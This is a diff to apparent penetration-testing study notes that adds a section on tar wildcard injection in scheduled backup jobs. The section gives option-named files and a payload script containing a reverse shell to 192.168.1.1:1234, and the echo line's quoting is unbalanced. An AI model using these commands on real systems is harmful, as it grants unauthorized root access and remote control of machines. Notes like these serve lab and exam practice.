@@ -140,6 +140,28 @@ debugfs <filesystem>
 
 boxes: Extplorer (PG practice)
 
+## Wildcard Injection
+
+If there is a scheduled task such as:
+```
+tar -cf /opt/backup *
+```
+Wildcard injection is possible. This commands purpose is to archive all files in current directory with wildcard operator (*).
+
+However, if a file is named "--checkpoint=1" or other tar options, it will be intepreted as an option rather than a file. Thus, we are able to run arbitrary commands with specifically crafted files.
+
+```
+# option files
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh pwn.sh'
+
+# executable script (can be any command)
+echo -e "#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/192.168.1.1/1234 0>&1' > pwn.sh
+```
+
+Boxes: PG Linux (Readys), OSCP C (Charlie)
+
 ## Persistence
 
 ```
